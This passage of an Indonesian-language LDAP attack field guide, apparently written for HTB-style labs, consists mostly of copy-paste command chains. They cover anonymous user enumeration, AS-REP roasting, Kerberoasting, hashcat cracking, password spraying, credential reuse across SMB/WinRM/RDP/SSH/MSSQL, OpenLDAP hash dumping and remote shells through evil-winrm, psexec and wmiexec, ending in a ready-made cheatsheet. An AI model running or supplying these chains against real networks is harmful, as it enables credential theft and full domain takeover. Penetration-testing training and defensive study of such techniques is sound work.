# LANGKAH B1: Enum users via LDAP anonymous
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(objectClass=user)" sAMAccountName 2>/dev/null \
    | grep "^sAMAccountName:" | awk '{print $2}' \
    > ~/ldap_loot/users/users.txt

# LANGKAH B2: AS-REP Roasting tanpa creds
impacket-GetNPUsers "$DOMAIN/" \
    -usersfile ~/ldap_loot/users/users.txt \
    -format hashcat \
    -output ~/ldap_loot/hashes/asrep.hashes \
    -dc-ip $TARGET \
    -no-pass

# LANGKAH B3: Crack
hashcat -m 18200 ~/ldap_loot/hashes/asrep.hashes \
    /usr/share/wordlists/rockyou.txt

# LANGKAH B4: Login
evil-winrm -i $TARGET -u "$USER" -p "$CRACKED_PASS"
```

**OUTPUT BERHASIL ✅:**

text

```
$krb5asrep$23$fsmith@HTB.LOCAL:...:TheCorrs2019

# Shell:
*Evil-WinRM* PS> whoami
htb\fsmith
```

---

### PATH C — SPN Enum → Kerberoasting → Service Account Shell

> Chain HTB Active style

Bash

```
# LANGKAH C1: Query SPN via LDAP dengan creds low-priv
ldapsearch -x -H ldap://$TARGET \
    -D "$USER@$DOMAIN" -w "$PASS" \
    -b "$BASE_DN" \
    "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" \
    sAMAccountName servicePrincipalName 2>/dev/null

# LANGKAH C2: Kerberoast
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" \
    -dc-ip $TARGET \
    -request \
    -outputfile ~/ldap_loot/hashes/kerberoast.hashes

# LANGKAH C3: Crack
hashcat -m 13100 ~/ldap_loot/hashes/kerberoast.hashes \
    /usr/share/wordlists/rockyou.txt \
    -o ~/ldap_loot/hashes/kerberoast_cracked.txt

# LANGKAH C4: Spawn shell dengan cracked creds
impacket-psexec "$DOMAIN/svc_admin:CrackedPass@$TARGET"
```

**OUTPUT BERHASIL ✅:**

text

```
C:\Windows\system32> whoami
nt authority\system
```

---

### PATH D — Credential Reuse ke Service Lain

> Setiap kali dapat creds dari LDAP, test ke semua service:

Bash

```
# Test semua service sekaligus (paralel)
nxc smb $TARGET -u "$USER" -p "$PASS" &
nxc winrm $TARGET -u "$USER" -p "$PASS" &
nxc rdp $TARGET -u "$USER" -p "$PASS" &
nxc ssh $TARGET -u "$USER" -p "$PASS" &
nxc mssql $TARGET -u "$USER" -p "$PASS" &
wait

# Filter yang berhasil
# Output (Pwn3d!) = admin/elevated access
# Output [+] tanpa Pwn3d! = user biasa, butuh privesc
```

**Cross-Service Credential Testing Chart:**

text

```
LDAP Creds Found
     │
     ├─ ─→ Port 22  (SSH)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ Port 445 (SMB)     → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     ├──→ Port 3389 (RDP)    → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
     ├──→ Port 5985 (WinRM)  → evil-winrm (direct shell)
     ├──→ Port 1433 (MSSQL)  → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
     ├──→ Port 3306 (MySQL)  → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     └──→ Full AD Context    → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
```

---

## ═══════════════════════════════════════

## FASE 7: LDAP OVER LDAPS / OPENLDAP SCENARIOS

## ═══════════════════════════════════════

### Langkah 7.1 — LDAPS (Port 636) dengan Self-Signed Certificate

Bash

```
# Error umum: sertifikat ditolak karena self-signed
# Solusi: Matikan validasi TLS

# Command 1: Via environment variable
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://$TARGET:636 \
    -s base namingcontexts

# Command 2: Via ldap.conf
echo "TLS_REQCERT never" | sudo tee -a /etc/ldap/ldap.conf
ldapsearch -x -H ldaps://$TARGET:636 -s base namingcontexts

# Command 3: NetExec otomatis handle TLS
nxc ldap $TARGET -u '' -p '' --port 636
```

**OUTPUT BERHASIL ✅:**

text

```
namingContexts: DC=inlanefreight,DC=local
```

---

### Langkah 7.2 — OpenLDAP Linux (Non-Active Directory)

> Kadang ditemukan di box Linux yang implementasi SSO sendiri.

Bash

```
# OpenLDAP pakai schema berbeda dari AD
# Cek dulu dengan RootDSE
ldapsearch -x -H ldap://$TARGET -s base namingcontexts

# Jika output ada "dc=example,dc=org" (bukan DC=DOMAIN,DC=local) → ini OpenLDAP

# Coba schema khas OpenLDAP
ldapsearch -x -H ldap://$TARGET \
    -b "dc=example,dc=org" \
    "(objectClass=posixAccount)" \
    uid userPassword \
    -E pr=1000/noprompt 2>/dev/null
```

**OUTPUT BERHASIL ✅ — OpenLDAP dengan password hash:**

text

```
dn: uid=devuser,ou=People,dc=example,dc=org
uid: devuser
userPassword:: e1NTSEF9M2JkM0l0K0...   ← Base64 SSHA hash!
```

➡️ Decode dan crack:

Bash

```
# Decode Base64
echo "e1NTSEF9M2JkM0l0K0..." | base64 -d | xxd | head

# Format hash untuk hashcat
# {SSHA} = Salted SHA1 → hashcat mode 111
echo "e1NTSEF9M2JkM0l0K0..." > ~/ldap_loot/hashes/openldap.hash
hashcat -m 111 ~/ldap_loot/hashes/openldap.hash /usr/share/wordlists/rockyou.txt

# {SHA} tanpa salt → mode 101
# {MD5} → mode 500
```

**OUTPUT BERHASIL ✅ — Hash cracked:**

text

```
e1NTSEF9...:devpassword123
```

➡️ Test SSH dengan credentials:

Bash

```
ssh devuser@$TARGET
# → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`Can't contact LDAP server (-1)`|Port 389 diblokir|Coba port 636 dengan `ldaps://`, atau port 3268|
|`Operations error (1)`|Anonymous bind ditolak|Wajib gunakan `-D user -w pass`|
|`Insufficient access rights (50)`|User tidak punya akses|Coba akun dengan privilege lebih tinggi|
|`Size limit exceeded (4)`|Output > 1000 entries|Tambah flag `-E pr=1000/noprompt`|
|`Invalid DN syntax (34)`|Format Base DN salah|Pastikan pakai quotes: `-b "DC=domain,DC=local"`|
|`No such object (32)`|Base DN tidak ada|Query ulang namingContexts dari RootDSE|
|`description:: VGVtc...` (Base64)|Nilai mengandung karakter spesial|`echo "..." \| base64 -d`|
|`Bad search filter (-7)`|Kurung tidak seimbang|Cek sintaks filter, setiap `(` harus ada `)`|
|`Kerberos Pre-Auth Failed`|Clock skew > 5 menit|`sudo rdate -n $TARGET` untuk sync jam|
|`STATUS_PASSWORD_MUST_CHANGE`|First login force change|`smbpasswd -r $TARGET -U username`|
|`TLS certificate error`|Self-signed cert ditolak|`LDAPTLS_REQCERT=never ldapsearch ...`|
|`STATUS_ACCOUNT_LOCKED_OUT`|Terlalu banyak percobaan|STOP spray! Tunggu lockout duration|
|BloodHound error: `Kerberos auth failed`|Clock skew atau DNS issue|Sync jam + pastikan DC di /etc/hosts|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Port 389/636/3268 Open
│
├─ FASE 0: Port Detection & RootDSE
│   ├─ Selalu dapat: Base DN, DC Hostname, OS Version
│   └─ Tambah ke /etc/hosts → set BASE_DN & DOMAIN vars
│
├─ FASE 1: Anonymous Bind Test
│   ├─ [Berhasil] → FASE 2 (Full Domain Dump)
│   └─ [Ditolak]  → Cari creds dari service lain → FASE 4
│
├─ FASE 2: Full Domain Dump (Anonymous)
│   ├─ [Password di Description]  → VALIDATE → Exploitation
│   ├─ [User list didapat]        → FASE 3 (Kerberos Attacks)
│   ├─ [Computer list didapat]    → Tambah ke /etc/hosts
│   └─ [Tidak ada sensitif]       → FASE 5 (Password Spray)
│
├─ FASE 3: Kerberos Attacks via LDAP
│   ├─ [SPN found]           → Kerberoasting → Crack → Service Account
│   ├─ [No PreAuth found]    → AS-REP Roasting → Crack → User Shell
│   └─ [AdminCount=1 found]  → Target untuk spraying
│
├─ FASE 4: Authenticated Enumeration
│   ├─ [BloodHound collected] → Graph analysis → AD attack path
│   ├─ [Delegation found]     → ke <a href="/docs/ad-delegation" class="text-[#00b4d8] hover:underline font-mono font-semibold">39_ad_delegation_workflow.md</a>
│   └─ [More creds found]     → Repeat chain
│
├─ FASE 5: Password Spraying (via LDAP)
│   ├─ [Creds found]         → FASE 4 → Exploitation
│   └─ [Locked out]          → STOP! Tunggu reset, spray 1 pass/session
│
└─ FASE 6: Exploitation
    ├─ PATH A: Desc Password → WinRM (evil-winrm)
    ├─ PATH B: AS-REP → Crack → Shell
    ├─ PATH C: Kerberoast → Crack → PsExec/WinRM
    └─ PATH D: Cred Reuse → Test semua service
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"
export USER=""; export PASS=""; export DOMAIN=""
export BASE_DN=""  # Set setelah RootDSE discovery
mkdir -p ~/ldap_loot/{users,creds,dump,hashes,bloodhound}

# === ROOTDSE & BASE DN ===
ldapsearch -x -H ldap://$TARGET -s base namingcontexts
export BASE_DN=$(ldapsearch -x -H ldap://$TARGET -s base namingcontexts 2>/dev/null | grep "^namingContexts:" | grep -v "CN=" | head -1 | awk '{print $2}')
export DOMAIN=$(echo $BASE_DN | sed 's/DC=//g' | sed 's/,/./g' | tr '[:upper:]' '[:lower:]')

# === ANONYMOUS BIND TEST ===
nxc ldap $TARGET -u '' -p ''
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=*)" -s sub -z 1 dn

# === ANONYMOUS DUMP ===
ldapdomaindump ldap://$TARGET -u "" -p "" -o ~/ldap_loot/dump/
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(description=*))" sAMAccountName description
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=user)" sAMAccountName -E pr=1000/noprompt 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}' > ~/ldap_loot/users/users.txt

# === KERBEROS ATTACKS ===
# AS-REP Roasting (no creds needed)
impacket-GetNPUsers "$DOMAIN/" -usersfile ~/ldap_loot/users/users.txt -format hashcat -output ~/ldap_loot/hashes/asrep.hashes -dc-ip $TARGET -no-pass
hashcat -m 18200 ~/ldap_loot/hashes/asrep.hashes /usr/share/wordlists/rockyou.txt

# Kerberoasting (needs 1 valid cred)
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $TARGET -request -outputfile ~/ldap_loot/hashes/kerberoast.hashes
hashcat -m 13100 ~/ldap_loot/hashes/kerberoast.hashes /usr/share/wordlists/rockyou.txt

# === AUTHENTICATED ENUM ===
nxc ldap $TARGET -u "$USER" -p "$PASS" --pass-pol
ldapdomaindump ldap://$TARGET -u "$DOMAIN\\$USER" -p "$PASS" -o ~/ldap_loot/dump/
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -dc "$TARGET" -c All --zip -o ~/ldap_loot/bloodhound/

# === PASSWORD SPRAY (via LDAP - safer than Kerberos) ===
nxc ldap $TARGET -u ~/ldap_loot/users/users.txt -p 'Welcome2024!' --continue-on-success

# === EXPLOITATION ===
evil-winrm -i $TARGET -u "$USER" -p "$PASS"                    # WinRM shell
impacket-psexec "$DOMAIN/$USER:$PASS@$TARGET"                   # PsExec (SYSTEM)
impacket-wmiexec "$DOMAIN/$USER:$PASS@$TARGET"                  # WMIExec (stealth)

# === LDAPS (TLS) ===
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://$TARGET:636 -s base namingcontexts

# === BASE64 DECODE ===
echo "VGVtcFBhc3MxMjMh" | base64 -d

# === OPENLDAP (Linux) ===
ldapsearch -x -H ldap://$TARGET -b "dc=example,dc=org" "(objectClass=posixAccount)" uid userPassword
```

---

> **➡️ NEXT:** Setelah LDAP selesai dan dapat credentials atau hash, lanjut ke **[12. RDP Exploitation & Remote Desktop Workflow — Master Field Guide](/docs/rdp)** untuk akses GUI Windows via RDP (xfreerdp, BlueKeep CVE-2019-0708, RDP Session Hijacking), atau jika environment AD → langsung ke **`<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`** untuk full AD attack chain dengan BloodHound.